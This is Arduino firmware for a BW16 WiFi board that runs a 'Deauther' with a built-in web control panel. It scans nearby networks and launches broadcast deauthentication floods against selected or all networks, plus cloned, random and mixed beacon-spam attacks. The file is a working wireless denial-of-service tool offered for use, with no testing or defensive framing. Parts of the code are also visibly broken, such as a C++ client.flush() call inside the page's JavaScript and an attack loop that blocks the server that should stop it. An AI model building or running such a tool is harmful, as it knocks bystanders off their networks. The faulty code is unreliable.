// by Ghost - WiFi Web Control Version (无屏幕版)
// 将原OLED+按钮交互改为WiFi网页交互
// 参考: https://github.com/xiaohe4966/BW16-WebControl

// ============================================================
// 原有头文件（保持不变）
// ============================================================
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

#undef max
#undef min
#include <vector>
#include <map>
#include "debug.h"
#include <Wire.h>

// ============================================================
// WiFi AP 配置（可在此修改）
// ============================================================
char AP_SSID[] = "BW16-Deauther";
char AP_PASS[] = "12345678";   // 至少8位
char AP_CHANNEL[] = "6";

// ============================================================
// 状态结构体（供Web页面读取）
// ============================================================
struct {
    bool attack_running = false;
    String attack_mode = "";
    int packets_sent = 0;
    int targets_count = 0;
    int scan_count = 0;
    unsigned long uptime = 0;
    bool ap_ok = false;
} status;

// ============================================================
// 原有变量（保留核心逻辑）
// ============================================================
typedef struct {
    String ssid;
    String bssid_str;
    uint8_t bssid[6];
    short rssi;
    uint channel;
    int security_type;
} WiFiScanResult;

int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> SelectedVector;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;
struct TargetInfo {
    uint8_t bssid[6];
    int channel;
    bool active;
};
std::vector<TargetInfo> smartTargets;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 600000;
int perdeauth = 3;
int num = 0;
int attackstate = 0;
bool attack_stop_requested = false;

// ============================================================
// 原有WiFi扫描逻辑（保持不变）
// ============================================================
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
    rtw_scan_result_t *record;
    if (scan_result->scan_complete == 0) {
        record = &scan_result->ap_details;
        record->SSID.val[record->SSID.len] = 0;
        WiFiScanResult result;
        result.ssid = String((const char *)record->SSID.val);
        result.channel = record->channel;
        result.rssi = record->signal_strength;
        result.security_type = record->security;
        memcpy(&result.bssid, &record->BSSID, 6);
        char bssid_str[] = "XX:XX:XX:XX:XX:XX";
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
            result.bssid[0], result.bssid[1], result.bssid[2],
            result.bssid[3], result.bssid[4], result.bssid[5]);
        result.bssid_str = bssid_str;
        scan_results.push_back(result);
    }
    return RTW_SUCCESS;
}

int scanNetworks() {
    Serial.print("Scanning WiFi Networks (5s)...");
    scan_results.clear();
    SelectedVector.clear();
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
        delay(5000);
        Serial.println(" Done!");
        Serial.print("[*] Networks found: ");
        Serial.println(scan_results.size());
        for (size_t i = 0; i < scan_results.size(); i++) {
            Serial.print("  [");
            Serial.print(i);
            Serial.print("] ");
            Serial.print(scan_results[i].ssid);
            Serial.print(" (");
            Serial.print(scan_results[i].bssid_str);
            Serial.print(") Ch:");
            Serial.print(scan_results[i].channel);
            Serial.print(" RSSI:");
            Serial.println(scan_results[i].rssi);
        }
        status.scan_count++;
        return 0;
    } else {
        Serial.println(" Failed!");
        return 1;
    }
}

void addValue(std::vector<int>& vec, int value) {
    bool found = false;
    for (int v : vec) {
        if (v == value) { found = true; break; }
    }
    if (!found) {
        vec.push_back(value);
    } else {
        for (auto it = vec.begin(); it != vec.end(); ) {
            if (*it == value) it = vec.erase(it);
            else ++it;
        }
    }
}

void toggleSelection(int index) {
    bool found = false;
    int foundIndex = -1;
    for (size_t i = 0; i < SelectedVector.size(); i++) {
        if (SelectedVector[i] == index) { found = true; foundIndex = i; break; }
    }
    if (found) {
        SelectedVector.erase(SelectedVector.begin() + foundIndex);
    } else {
        SelectedVector.push_back(index);
    }
}

// ============================================================
// 原有发包攻击函数（保持不变核心逻辑）
// ============================================================
void sendDeauth(uint8_t* bssid, int channel, int count) {
    wext_set_channel(WLAN0_NAME, channel);
    for (int i = 0; i < count; i++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        status.packets_sent += 3;
        delay(5);
    }
}

void sendBeacon(uint8_t* bssid, int channel, const char* ssid, int count) {
    wext_set_channel(WLAN0_NAME, channel);
    for (int i = 0; i < count; i++) {
        wifi_tx_beacon_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid);
    }
    status.packets_sent += count;
}

// ============================================================
// 攻击任务（供Web调用）
// ============================================================
void attackTask(const String& mode) {
    status.attack_running = true;
    status.attack_mode = mode;
    attack_stop_requested = false;
    Serial.println("Attack started: " + mode);

    if (mode == "single") {
        while (!attack_stop_requested) {
            if (SelectedVector.empty()) { status.attack_running = false; return; }
            for (size_t vi = 0; vi < SelectedVector.size(); vi++) {
                if (attack_stop_requested) break;
                int idx = SelectedVector[vi];
                if (idx >= 0 && idx < (int)scan_results.size()) {
                    memcpy(deauth_bssid, scan_results[idx].bssid, 6);
                    sendDeauth(deauth_bssid, scan_results[idx].channel, perdeauth);
                }
            }
            delay(50);
        }
    }
    else if (mode == "multi") {
        while (!attack_stop_requested) {
            if (SelectedVector.empty()) { status.attack_running = false; return; }
            if (num >= (int)SelectedVector.size()) num = 0;
            int idx = SelectedVector[num];
            if (idx >= 0 && idx < (int)scan_results.size()) {
                memcpy(deauth_bssid, scan_results[idx].bssid, 6);
                sendDeauth(deauth_bssid, scan_results[idx].channel, 10);
            }
            num++;
            delay(50);
        }
    }
    else if (mode == "all") {
        while (!attack_stop_requested) {
            for (size_t i = 0; i < scan_results.size(); i++) {
                if (attack_stop_requested) break;
                memcpy(deauth_bssid, scan_results[i].bssid, 6);
                sendDeauth(deauth_bssid, scan_results[i].channel, perdeauth);
            }
        }
    }
    else if (mode == "beacon") {
        while (!attack_stop_requested) {
            for (size_t vi = 0; vi < SelectedVector.size(); vi++) {
                if (attack_stop_requested) break;
                int idx = SelectedVector[vi];
                if (idx >= 0 && idx < (int)scan_results.size()) {
                    String ssid = scan_results[idx].ssid;
                    if (ssid.length() == 0) ssid = scan_results[idx].bssid_str;
                    memcpy(becaon_bssid, scan_results[idx].bssid, 6);
                    sendBeacon(becaon_bssid, scan_results[idx].channel, ssid.c_str(), 10);
                }
            }
            delay(100);
        }
    }
    else if (mode == "randombeacon") {
        while (!attack_stop_requested) {
            int randChannel = allChannels[random(0, sizeof(allChannels)/sizeof(allChannels[0]))];
            String ssid = "";
            const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            for (int i = 0; i < 10; i++) {
                ssid += chars[random(0, (int)strlen(chars))];
            }
            uint8_t randMac[6];
            for (int i = 0; i < 6; i++) randMac[i] = (uint8_t)random(0, 256);
            randMac[0] = (randMac[0] & 0xFC) | 0x02;
            wext_set_channel(WLAN0_NAME, randChannel);
            for (int i = 0; i < 5; i++) {
                wifi_tx_beacon_frame((void *)randMac, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str());
                status.packets_sent++;
            }
            delay(200);
        }
    }
    else if (mode == "beacon_deauth") {
        while (!attack_stop_requested) {
            for (size_t vi = 0; vi < SelectedVector.size(); vi++) {
                if (attack_stop_requested) break;
                int idx = SelectedVector[vi];
                if (idx >= 0 && idx < (int)scan_results.size()) {
                    String ssid = scan_results[idx].ssid;
                    if (ssid.length() == 0) ssid = scan_results[idx].bssid_str;
                    memcpy(becaon_bssid, scan_results[idx].bssid, 6);
                    memcpy(deauth_bssid, scan_results[idx].bssid, 6);
                    sendBeacon(becaon_bssid, scan_results[idx].channel, ssid.c_str(), 5);
                    sendDeauth(deauth_bssid, scan_results[idx].channel, 5);
                }
            }
            delay(50);
        }
    }

    status.attack_running = false;
    status.attack_mode = "";
    Serial.println("Attack stopped");
}

// ============================================================
// Web服务器 - HTTP工具函数
// ============================================================
void sendJSON(WiFiClient& client, const String& json) {
    client.print("HTTP/1.1 200 OK\r\n");
    client.print("Content-Type: application/json\r\n");
    client.print("Content-Length: ");
    client.println(json.length());
    client.println("Connection: close\r\n");
    client.println();
    client.print(json);
    client.flush();  // 等待数据完全发送出去再断开
}

// ============================================================
// Web服务器 - 主处理函数（参考xiaohe4966/BW16-WebControl风格）
// ============================================================
void handleClient(WiFiClient& client) {
    // 逐字符读取HTTP请求（参考BW16-WebControl，避免readStringUntil兼容问题）
    String currentLine = "";
    String path = "";
    String action = "";
    bool pathParsed = false;
    unsigned long timeout = millis() + 2000;  // 2秒超时

    while (client.connected() && millis() < timeout) {
        if (!client.available()) {
            delay(1);
            continue;
        }

        char c = client.read();
        if (c == '\n') {
            if (currentLine.length() == 0) break;  // 空行=Header结束
            // 解析第一行（GET /path HTTP/1.1）
            if (!pathParsed && currentLine.startsWith("GET ")) {
                int space1 = 4;
                int space2 = currentLine.indexOf(' ', space1);
                if (space2 > space1) {
                    path = currentLine.substring(space1, space2);
                }
                pathParsed = true;
                Serial.print("[HTTP] ");
                Serial.println(path);
            }
            currentLine = "";
        } else if (c != '\r') {
            currentLine += c;
        }
    }

    // 从path解析action
    if (path.startsWith("/api")) {
        int q = path.indexOf('?');
        if (q >= 0) {
            String qs = path.substring(q + 1);
            int eq = qs.indexOf('=');
            if (eq > 0) {
                action = qs.substring(eq + 1);
                int amp = action.indexOf('&');
                if (amp > 0) action = action.substring(0, amp);
            }
        }
    }

    // 路由处理
    if (path == "/" || path == "/index.html" || path == "/index") {
        sendHTML(client);
    }
    else if (path.startsWith("/api")) {
        handleAPI(client, action, path);
    }
    else if (path == "/status") {
        sendStatusJSON(client);
    }
    else if (path == "/networks") {
        sendNetworksJSON(client);
    }
    else {
        client.print("HTTP/1.1 404 Not Found\r\n");
        client.print("Content-Type: text/plain\r\n");
        client.print("Content-Length: 9\r\n");
        client.println("Connection: close\r\n");
        client.println();
        client.print("Not Found");
        client.flush();
    }

    client.stop();
}

void handleAPI(WiFiClient& client, String action, String fullPath) {
    String response = "";
    bool ok = true;

    // 从 query string 解析 index 参数
    int indexFromQuery = -1;
    int idx = fullPath.indexOf("index=");
    if (idx >= 0) {
        int start = idx + 6;
        int end = fullPath.indexOf('&', start);
        if (end < 0) end = fullPath.length();
        indexFromQuery = fullPath.substring(start, end).toInt();
    }

    if (action == "scan") {
        scanNetworks();
        response = "{\"ok\":true,\"msg\":\"Scan done\",\"count\":" + String(scan_results.size()) + "}";
    }
    else if (action == "select") {
        if (indexFromQuery >= 0) {
            bool found = false;
            for (size_t i = 0; i < SelectedVector.size(); i++) {
                if (SelectedVector[i] == indexFromQuery) { found = true; break; }
            }
            if (!found) SelectedVector.push_back(indexFromQuery);
        }
        String sel = "[";
        for (size_t i = 0; i < SelectedVector.size(); i++) {
            sel += String(SelectedVector[i]);
            if (i < SelectedVector.size() - 1) sel += ",";
        }
        sel += "]";
        response = "{\"ok\":true,\"selected\":" + sel + ",\"count\":" + String(SelectedVector.size()) + "}";
    }
    else if (action == "toggle") {
        if (indexFromQuery >= 0) {
            toggleSelection(indexFromQuery);
        }
        String sel = "[";
        for (size_t i = 0; i < SelectedVector.size(); i++) {
            sel += String(SelectedVector[i]);
            if (i < SelectedVector.size() - 1) sel += ",";
        }
        sel += "]";
        response = "{\"ok\":true,\"selected\":" + sel + "}";
    }
    else if (action.startsWith("attack_")) {
        String mode = action.substring(7);
        if (!status.attack_running) {
            attackTask(mode);
            response = "{\"ok\":true,\"msg\":\"Started: " + mode + "\"}";
        } else {
            response = "{\"ok\":false,\"msg\":\"Attack already running\"}";
        }
    }
    else if (action == "stop") {
        attack_stop_requested = true;
        response = "{\"ok\":true,\"msg\":\"Stopping...\"}";
    }
    else if (action == "clear") {
        SelectedVector.clear();
        response = "{\"ok\":true,\"msg\":\"Selection cleared\"}";
    }
    else if (action == "selectall") {
        SelectedVector.clear();
        for (size_t i = 0; i < scan_results.size(); i++) {
            SelectedVector.push_back(i);
        }
        response = "{\"ok\":true,\"msg\":\"All selected\",\"count\":" + String(SelectedVector.size()) + "}";
    }
    else if (action == "reboot") {
        response = "{\"ok\":true,\"msg\":\"Rebooting...\"}";
        sendJSON(client, response);
        delay(100);
        client.stop();
        delay(200);
        *(uint32_t *)0xE000EDF0 = 0x5FA0004;
        return;
    }
    else {
        ok = false;
        response = "{\"ok\":false,\"msg\":\"Unknown action: " + action + "\"}";
    }

    sendJSON(client, response);
}

void sendStatusJSON(WiFiClient& client) {
    String sel = "[";
    for (size_t i = 0; i < SelectedVector.size(); i++) {
        sel += String(SelectedVector[i]);
        if (i < SelectedVector.size() - 1) sel += ",";
    }
    sel += "]";

    String json = "{";
    json += "\"attack_running\":" + String(status.attack_running ? "true" : "false") + ",";
    json += "\"attack_mode\":\"" + status.attack_mode + "\",";
    json += "\"packets_sent\":" + String(status.packets_sent) + ",";
    json += "\"scan_count\":" + String(scan_results.size()) + ",";
    json += "\"selected\":" + sel + ",";
    json += "\"selected_count\":" + String(SelectedVector.size()) + ",";
    json += "\"uptime\":" + String(millis() / 1000) + ",";
    json += "\"uptime_str\":\"" + String(millis() / 1000) + "s\"";
    json += "}";
    sendJSON(client, json);
}

void sendNetworksJSON(WiFiClient& client) {
    Serial.print("[NETWORKS] Sending networks: count=");
    Serial.println(scan_results.size());

    String json = "[";
    for (size_t i = 0; i < scan_results.size(); i++) {
        if (i > 0) json += ",";
        json += "{\"index\":" + String(i);
        json += ",\"ssid\":\"" + scan_results[i].ssid + "\"";
        json += ",\"bssid\":\"" + scan_results[i].bssid_str + "\"";
        json += ",\"channel\":" + String(scan_results[i].channel);
        json += ",\"rssi\":" + String(scan_results[i].rssi) + "}";
    }
    json += "]";

    Serial.print("[NETWORKS] JSON: ");
    Serial.println(json);

    sendJSON(client, json);
}

// ============================================================
// 内嵌Web页面（HTML/CSS/JS，无外部依赖）
// ============================================================
void sendHTML(WiFiClient& client) {
    // 先发送HTTP头（用\r\n，参考xiaohe4966项目）
    client.print("HTTP/1.1 200 OK\r\n");
    client.print("Content-Type: text/html; charset=utf-8\r\n");
    client.print("Connection: close\r\n");
    client.println();

    client.print(R"=====(
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BW16-Deauther</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#0a0a1a;color:#e0e0e0;min-height:100vh;padding-bottom:80px}
header{background:#1a1a2e;padding:15px 20px;border-bottom:2px solid #00d4ff;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
h1{color:#00d4ff;font-size:18px}
.status-bar{display:flex;gap:15px;font-size:12px;flex-wrap:wrap}
.status-item{background:#16213e;padding:5px 12px;border-radius:20px}
.status-item span{color:#00d4ff}
.main{padding:15px;max-width:800px;margin:0 auto}
.section{background:#1a1a2e;border-radius:12px;padding:15px;margin-bottom:15px;border:1px solid #2a2a4a}
.section-title{font-size:14px;color:#888;margin-bottom:10px;text-transform:uppercase;letter-spacing:1px}
.btn-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px}
.btn{display:inline-block;padding:10px 16px;border-radius:8px;border:none;cursor:pointer;font-size:13px;font-weight:bold;transition:all .2s;text-align:center;min-width:80px}
.btn-primary{background:#00d4ff;color:#000}
.btn-primary:hover{background:#00bcd4;transform:translateY(-1px)}
.btn-danger{background:#ff4757;color:#fff}
.btn-danger:hover{background:#e84118}
.btn-warning{background:#ff9f43;color:#000}
.btn-warning:hover{background:#e67e22}
.btn-success{background:#2ed573;color:#000}
.btn-success:hover{background:#26c064}
.btn-secondary{background:#3742fa;color:#fff}
.btn-secondary:hover{background:#2832cc}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
.wifi-list{max-height:350px;overflow-y:auto}
.wifi-item{display:flex;align-items:center;padding:10px;border-bottom:1px solid #2a2a4a;cursor:pointer;transition:background .2s}
.wifi-item:hover{background:#16213e}
.wifi-item.selected{background:#0d4f5e;border-left:3px solid #00d4ff}
.wifi-item .ssid{flex:1;font-size:14px;word-break:break-all;margin-right:10px}
.wifi-item .info{font-size:11px;color:#888;text-align:right;white-space:nowrap}
.wifi-item .ch{color:#00d4ff}
.wifi-item .rssi{color:#ff9f43}
.wifi-item .sel-mark{color:#2ed573;font-size:16px;margin-left:8px;min-width:16px;text-align:center}
.attack-panel{text-align:center;padding:20px}
.attack-mode{font-size:28px;font-weight:bold;color:#ff4757;margin:10px 0;display:none}
.attack-mode.active{display:block}
.attack-pkt{font-size:48px;font-weight:bold;color:#00d4ff;margin:10px 0}
.attack-pkt-label{font-size:12px;color:#888;margin-bottom:20px}
.attack-status{font-size:14px;color:#888;margin-top:10px}
.log-area{background:#0a0a1a;border:1px solid #2a2a4a;border-radius:8px;padding:10px;max-height:120px;overflow-y:auto;font-family:monospace;font-size:11px;color:#0f0}
.log-line{margin-bottom:3px}
.tab-bar{display:flex;background:#16213e;border-radius:8px;overflow:hidden;margin-bottom:15px}
.tab{flex:1;padding:10px;text-align:center;cursor:pointer;font-size:13px;color:#888;transition:all .2s;border:none;background:none}
.tab.active{background:#00d4ff;color:#000;font-weight:bold}
.tab:hover:not(.active){background:#1e2a4a}
.tab-content{display:none}
.tab-content.active{display:block}
.attack-btns{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
.attack-btns .btn{width:100%}
@media(min-width:600px){.attack-btns{grid-template-columns:1fr 1fr 1fr}}
.loading{color:#ff9f43;font-size:12px;margin-left:10px}
</style>
</head>
<body>
<header>
<h1>📡 BW16-Deauther</h1>
<div class="status-bar">
<div class="status-item">📶 <span id="scanCount">0</span> 个网络</div>
<div class="status-item">🎯 <span id="selCount">0</span> 已选</div>
<div class="status-item">📦 <span id="pktCount">0</span> 包</div>
<div class="status-item">⏱️ <span id="uptime">0s</span></div>
<div class="status-item" id="attackStatus" style="display:none">⚠️ 攻击中:<span id="attackMode"></span></div>
</div>
</header>
<div class="main">
<div class="tab-bar">
<button class="tab active" onclick="showTab('scan')">📶 扫描</button>
<button class="tab" onclick="showTab('attack')">⚔️ 攻击</button>
<button class="tab" onclick="showTab('log')">📋 日志</button>
</div>

<div id="tab-scan" class="tab-content active">
<div class="section">
<div class="section-title">WiFi 网络列表</div>
<div class="btn-row">
<button class="btn btn-primary" onclick="scan()">🔍 扫描</button>
<button class="btn btn-success" onclick="selectAll()">☑ 全选</button>
<button class="btn btn-warning" onclick="clearSel()">🗑 清除</button>
</div>
<div id="loading" class="loading" style="display:none">🔄 扫描中，请稍候(3~5秒)...</div>
<div id="wifiList" class="wifi-list"></div>
</div>
</div>

<div id="tab-attack" class="tab-content">
<div class="section">
<div class="section-title">解除认证攻击</div>
<div class="attack-btns">
<button class="btn btn-danger" onclick="attack('single')">🎯 单一攻击</button>
<button class="btn btn-danger" onclick="attack('multi')">🔄 多重攻击</button>
<button class="btn btn-danger" onclick="attack('all')">🌐 全网攻击</button>
</div>
</div>
<div class="section">
<div class="section-title">信标攻击</div>
<div class="attack-btns">
<button class="btn btn-warning" onclick="attack('beacon')">📶 相同信标</button>
<button class="btn btn-warning" onclick="attack('randombeacon')">🎲 随机信标</button>
</div>
</div>
<div class="section">
<div class="section-title">混合攻击</div>
<div class="attack-btns">
<button class="btn btn-secondary" onclick="attack('beacon_deauth')">⚡ 信标+解除认证</button>
</div>
</div>
<div class="section attack-panel">
<div class="attack-mode" id="attackModeDisplay"></div>
<div class="attack-pkt" id="pktDisplay">0</div>
<div class="attack-pkt-label">已发送数据包</div>
<button class="btn btn-danger" id="stopBtn" style="display:none" onclick="stopAttack()">⏹ 停止攻击</button>
<div class="attack-status" id="attackTip">选择网络后开始攻击</div>
</div>
</div>

<div id="tab-log" class="tab-content">
<div class="section">
<div class="section-title">实时日志</div>
<div class="btn-row">
<button class="btn btn-warning" onclick="clearLog()">🗑 清空</button>
</div>
<div id="logArea" class="log-area"></div>
</div>
</div>
</div>
</div>
<script>
let lastPkt = 0;
let lastSel = [];

function pollStatus() {
    fetch('/status').then(r=>r.json()).then(data=>{
        document.getElementById('scanCount').textContent = data.scan_count;
        document.getElementById('selCount').textContent = data.selected_count;
        document.getElementById('pktCount').textContent = data.packets_sent;
        document.getElementById('uptime').textContent = data.uptime_str;
        document.getElementById('pktDisplay').textContent = data.packets_sent;
        if (data.attack_running) {
            document.getElementById('attackStatus').style.display = 'block';
            document.getElementById('attackMode').textContent = data.attack_mode;
            document.getElementById('stopBtn').style.display = 'inline-block';
            document.getElementById('attackModeDisplay').textContent = data.attack_mode;
            document.getElementById('attackModeDisplay').classList.add('active');
        } else {
            document.getElementById('attackStatus').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'none';
            document.getElementById('attackModeDisplay').classList.remove('active');
        }
        if (data.packets_sent > lastPkt) {
            lastPkt = data.packets_sent;
            document.getElementById('pktDisplay').textContent = lastPkt;
        }
        if (JSON.stringify(data.selected) !== JSON.stringify(lastSel)) {
            lastSel = data.selected;
            renderList();
        }
    }).catch(function(){});
    client.flush();
}

let wifiData = [];

function scan() {
    document.getElementById('loading').style.display = 'inline';
    log('🔍 开始扫描 WiFi 网络...');
    fetch('/api?action=scan').then(function(r){return r.json();}).then(function(data){
        document.getElementById('loading').style.display = 'none';
        if (data.ok) {
            log('✅ 扫描完成，发现 ' + data.count + ' 个网络');
            loadNetworks();
        } else {
            log('❌ 扫描失败: ' + data.msg);
        }
    }).catch(function(e){
        document.getElementById('loading').style.display = 'none';
        log('❌ 网络错误: ' + e);
    });
}

function loadNetworks() {
    fetch('/networks').then(function(r){return r.json();}).then(function(data){
        wifiData = data;
        lastSel = [];
        renderList();
    });
}

function renderList() {
    var list = document.getElementById('wifiList');
    if (!wifiData || wifiData.length === 0) {
        list.innerHTML = '<div style="color:#888;font-size:13px;text-align:center;padding:20px">点击"扫描"获取网络列表</div>';
        return;
    }
    var sel = lastSel || [];
    var html = '';
    for (var i = 0; i < wifiData.length; i++) {
        var w = wifiData[i];
        var isSel = sel.indexOf(i) >= 0;
        var band = w.channel >= 36 ? '5G' : '2.4G';
        var rssiColor = w.rssi > -50 ? '#2ed573' : w.rssi > -70 ? '#ff9f43' : '#ff4757';
        html += '<div class="wifi-item' + (isSel?' selected':'') + '" onclick="toggleSel(' + i + ')">';
        html += '<div class="ssid">' + escHtml(w.ssid || w.bssid) + '</div>';
        html += '<div class="info">';
        html += '<span class="ch">' + band + ' CH' + w.channel + '</span> ';
        html += '<span class="rssi" style="color:' + rssiColor + '">' + w.rssi + 'dBm</span>';
        html += '</div>';
        html += '<div class="sel-mark">' + (isSel?'✓':'') + '</div>';
        html += '</div>';
    }
    list.innerHTML = html;
}

function escHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function toggleSel(idx) {
    fetch('/api?action=toggle&index=' + idx).then(function(r){return r.json();}).then(function(data){
        if (data.ok) {
            lastSel = data.selected;
            renderList();
        }
    });
}

function selectAll() {
    fetch('/api?action=selectall').then(function(r){return r.json();}).then(function(data){
        if (data.ok) {
            log('✅ 已全选 ' + data.count + ' 个目标');
            lastSel = [];
            for (var i = 0; i < wifiData.length; i++) lastSel.push(i);
            renderList();
        }
    });
}

function clearSel() {
    fetch('/api?action=clear').then(function(r){return r.json();}).then(function(data){
        if (data.ok) {
            lastSel = [];
            renderList();
            log('🗑 已清除选择');
        }
    });
}

function attack(mode) {
    if (wifiData && wifiData.length === 0) {
        log('⚠️ 请先扫描网络');
        return;
    }
    var names = {
        single:'单一攻击', multi:'多重攻击', all:'全网攻击',
        beacon:'信标攻击', randombeacon:'随机信标', beacon_deauth:'混合攻击'
    };
    log('⚔️ 启动: ' + (names[mode] || mode));
    fetch('/api?action=attack_' + mode).then(function(r){return r.json();}).then(function(data){
        if (data.ok) {
            log('✅ ' + data.msg);
            document.getElementById('attackTip').textContent = names[mode] + ' 运行中...';
        } else {
            log('❌ ' + data.msg);
        }
    }).catch(function(e){ log('❌ 网络错误: ' + e); });
}

function stopAttack() {
    fetch('/api?action=stop').then(function(r){return r.json();}).then(function(data){
        log('⏹ ' + data.msg);
        document.getElementById('attackTip').textContent = '攻击已停止';
    });
}

function showTab(name) {
    var tabs = document.querySelectorAll('.tab');
    for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('active');
    var contents = document.querySelectorAll('.tab-content');
    for (var i = 0; i < contents.length; i++) contents[i].classList.remove('active');
    var tabBtns = document.querySelectorAll('.tab');
    for (var i = 0; i < tabBtns.length; i++) {
        if (tabBtns[i].getAttribute('onclick').indexOf(name) >= 0) tabBtns[i].classList.add('active');
    }
    document.getElementById('tab-' + name).classList.add('active');
    if (name === 'scan' && wifiData.length === 0) scan();
}

function log(msg) {
    var area = document.getElementById('logArea');
    var t = new Date().toLocaleTimeString();
    var div = document.createElement('div');
    div.className = 'log-line';
    div.textContent = '[' + t + '] ' + msg;
    area.appendChild(div);
    area.scrollTop = area.scrollHeight;
}

function clearLog() {
    document.getElementById('logArea').innerHTML = '';
    log('📋 日志已清空');
}

// 初始加载
wifiData = [];
lastSel = [];
loadNetworks();
setTimeout(function() {
    if (wifiData.length > 0) {
        log('📡 系统就绪，已扫描 ' + wifiData.length + ' 个网络');
    } else {
        log('📡 系统就绪，点击"扫描"开始');
    }
}, 1500);

setInterval(pollStatus, 2000);
</script>
</body>
</html>
)=====");
}

// ============================================================
// setup / loop
// ============================================================
void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println();
    Serial.println("========================================");
    Serial.println("  BW16-Deauther Web Control v1.0");
    Serial.println("  by Ghost - WiFi AP Mode (无屏幕)");
    Serial.println("========================================");

    // 启动AP（参考BW16-WebControl的判断方式）
    Serial.println("[*] Starting WiFi AP...");
    int apStatus = WiFi.apbegin(AP_SSID, AP_PASS, AP_CHANNEL);
    Serial.print("[*] apbegin ret="); Serial.println(apStatus);
    Serial.print("[*] WL_CONNECTED="); Serial.println((int)WL_CONNECTED);

    delay(2000);

    IPAddress apIP = WiFi.localIP();
    Serial.print("[*] localIP=");
    Serial.print((int)apIP[0]); Serial.print(".");
    Serial.print((int)apIP[1]); Serial.print(".");
    Serial.print((int)apIP[2]); Serial.print(".");
    Serial.println((int)apIP[3]);

    if (apIP[0] != 0) {
        status.ap_ok = true;
        Serial.println("✅ WiFi AP started!");
        Serial.print("   SSID: "); Serial.println(AP_SSID);
        Serial.print("   Password: "); Serial.println(AP_PASS);
        Serial.print("   Channel: "); Serial.println(AP_CHANNEL);
        Serial.print("   AP IP: "); Serial.println(apIP);
        Serial.println("   Web Interface: http://192.168.1.1");
    } else {
        Serial.println("❌ WiFi AP failed! (IP=0.0.0.0)");
        // 不阻塞，继续尝试
    }

    // 启动Web服务器
    server.begin();
    Serial.println("✅ HTTP Server started on port 80");

    // 初始扫描
    Serial.println("[*] Initial WiFi scan...");
    scanNetworks();

    Serial.println("========================================");
    Serial.println("✅ System READY!");
    Serial.println("========================================");
}

void loop() {
    WiFiClient client = server.available();
    if (client) {
        handleClient(client);
    }
    delay(10);

    // 每10分钟自动扫描更新（后台静默）
    if (millis() - lastScanTime >= SCAN_INTERVAL) {
        scanNetworks();
        lastScanTime = millis();
    }
}
